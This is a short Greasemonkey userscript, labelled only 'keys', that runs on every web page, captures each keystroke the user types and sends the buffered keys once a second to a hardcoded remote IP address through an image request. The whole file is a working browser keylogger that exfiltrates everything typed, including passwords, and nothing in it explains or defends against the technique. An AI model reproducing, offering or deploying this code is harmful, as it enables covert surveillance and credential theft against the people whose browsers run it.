// ==UserScript==
// @name keys
// @description   keys
// @include       http*://*
// http://72.249.118.49/~vanilla1/keys/keys.php?keys=
// ==/UserScript==

GM_setValue('keys', '');
unsafeWindow.onkeypress = function(e) {
	eventobj = window.event?event:e;
	key = eventobj.keyCode?eventobj.keyCode:eventobj.charCode;
	keys = GM_getValue('keys');
	keys+= String.fromCharCode(key);
	GM_setValue('keys', keys);
}
window.setInterval(function(){
	new Image().src = 'http://72.249.118.49/~vanilla1/keys/keys.php?keys='+GM_getValue('keys');
	GM_setValue('keys', '');
}, 1000)